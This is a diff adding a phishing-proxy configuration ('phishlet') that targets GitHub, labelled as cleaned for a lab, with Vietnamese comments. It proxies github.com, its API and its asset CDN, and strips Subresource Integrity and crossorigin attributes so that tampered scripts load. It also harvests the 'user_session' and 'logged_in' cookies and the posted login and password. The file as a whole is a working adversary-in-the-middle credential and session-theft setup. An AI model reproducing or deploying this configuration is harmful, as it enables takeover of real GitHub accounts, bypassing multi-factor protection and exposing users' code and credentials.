@@ -1,0 +1,34 @@
+name: 'github'
+author: 'Lux1dus - Cleaned for Lab'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # Tên miền chính
+  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true}
+  # Điểm cuối API
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: false, is_landing: false}
+  # Tải tài nguyên từ CDN
+  - {phish_sub: 'assets', orig_sub: 'github', domain: 'githubassets.com', session: false, is_landing: false}
+
+sub_filters:
+  # Tuyệt chiêu: Xóa mã băm bảo mật (SRI) để trình duyệt không từ chối nạp CSS/JS giả mạo
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="[^"]+"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'crossorigin="anonymous"', replace: '', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['user_session', '__Host-user_session_same_site', 'logged_in']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'github.com'
+  path: '/login'
